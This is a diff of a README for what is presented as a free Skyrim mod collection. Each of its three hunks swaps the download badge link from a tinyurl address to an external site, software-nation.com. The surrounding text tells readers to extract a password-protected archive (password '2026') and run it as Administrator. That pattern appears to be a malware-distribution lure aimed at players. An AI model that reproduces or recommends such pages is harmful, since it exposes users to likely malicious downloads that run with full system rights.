@@ -9,7 +9,7 @@ The **🐉 The Elder Scrolls V: Skyrim Mods** is a **free** ultimate mod collect
 
 <div align="center">
 
-[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-elder-scrolls-v-mods)
+[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-elder-scrolls-v-mods)
 
 </div>
 
@@ -109,7 +109,7 @@ Skyrim is incredible, but mods make it legendary. This free collection gives you
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup → Install mods
 
-[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-elder-scrolls-v-mods)
+[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-elder-scrolls-v-mods)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -237,7 +237,7 @@ Transform Skyrim into the ultimate RPG for free. **The Elder Scrolls V: Skyrim M
 
 <div align="center">
 
-[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-elder-scrolls-v-mods)
+[![Download Skyrim Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-elder-scrolls-v-mods)
 
 **Version 4.6.1** — Free Skyrim mod collection. April 2026 update. Zero cost. No payment.
 
